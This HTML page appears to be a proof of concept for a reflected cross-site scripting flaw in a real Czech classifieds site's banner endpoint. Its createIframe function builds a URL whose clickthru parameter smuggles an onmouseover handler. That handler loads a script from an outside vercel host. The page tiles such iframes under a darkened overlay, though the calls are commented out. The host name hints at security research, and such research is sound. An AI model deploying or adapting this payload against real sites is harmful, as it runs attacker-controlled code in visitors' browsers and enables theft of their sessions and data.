<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        body {
            margin: 0;
            overflow: hidden;
        }
        iframe {
            position: absolute;
            left: 0;
            top: 0;
            width: 298px;
            height: 94px;
        }
        overlay {
            display: block;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            position: absolute;
            left: 0;
            top: 0;
            z-index: 999;
            pointer-events: none;
        }
    </style>
</head>
<body>
<overlay></overlay>
<script>
    window.addEventListener("resize", generateIframes);
    document.addEventListener("click", generateIframes);

    function generateIframes()
    {
        document.querySelectorAll("iframe").forEach(iframe => iframe.remove());
        const w = window.innerWidth;
        const h = window.innerHeight;
        const iframeW = 298;
        const iframeH = 94;

        const xTime = Math.ceil(w / iframeW);
        const yTime = Math.ceil(h / iframeH);

        console.log(xTime, yTime);

        // createIframe(0, 0);
        // createIframe(300, 300);
    } generateIframes();

    function createIframe(x, y) {
        const src = "https://www.sauto.cz/bannerova-reklama?perPage=1&banner=1&clickthru=/%22onmouseover=%22let%20s%20=%20document.createElement(%27script%27);%20s.setAttribute(%27src%27,%27https://whitehat-email-cz.vercel.app//index.js%27);%20document.head.appendChild(s)";
        const iframe = document.createElement("iframe");
        iframe.setAttribute("scrolling", "no");
        iframe.src = src;
        iframe.style.left = x + "px";
        iframe.style.top = y + "px";
        iframe.setAttribute("frameborder", "0");
        document.body.appendChild(iframe);
    }
</script>
</body>
</html>
